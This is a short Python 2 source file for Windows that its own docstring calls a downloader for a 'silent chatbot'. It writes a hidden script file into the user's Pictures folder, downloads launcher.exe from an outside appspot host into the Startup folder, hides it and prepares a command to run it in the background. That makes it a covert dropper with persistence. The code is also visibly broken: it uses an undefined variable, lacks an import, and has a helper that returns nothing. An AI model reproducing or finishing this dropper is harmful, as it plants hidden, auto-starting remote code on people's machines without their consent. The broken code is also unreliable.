"""Makes a thread to download/install/run the silent chatbot.

Should only be run on windows :(
"""

import cPickle
import threading
import urllib2
import win32api
import win32con

from win32com.shell import shell, shellcon

class Downloader(threading.Thread):
    def __init__(self, script):
        """Make a thread to download/install the silent chatbot.
        @param script: A script in list form.  See scriptreader.py
        @type script: list
        """
        threading.Thread.__init__(self)
        self.script = script
        
    def run(self):
        """Run the thread."""
        #Make a file for the script
        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
        file = open(path, "w")
        #Save the script
        cPickle.dump(script, file)
        #Hide the script
        file.close()
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
        
        #Get a path for the launcher
        path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
        #Save the launcher
        url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
        file = open(path, "w")
        file.write(url.read())
        file.close()
        url.close()
        #Hide the launcher
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)

        #Run the launcher
        command = "start /b %s"%win32api.GetShortPathName(path)
        print command
        
#Utility functions.  May be useful elsewhere
def file_in_special_path(specialpath, file):
    """Make a path composed of a special (CSIDL) path and a file name.
    
    @param specialpath: The CSIDL path found in shellcon
    @param file: the name of the file
    """
    path = shell.SHGetFolderPath(0, specialpath, None, 0)
    path = os.path.join(path, file)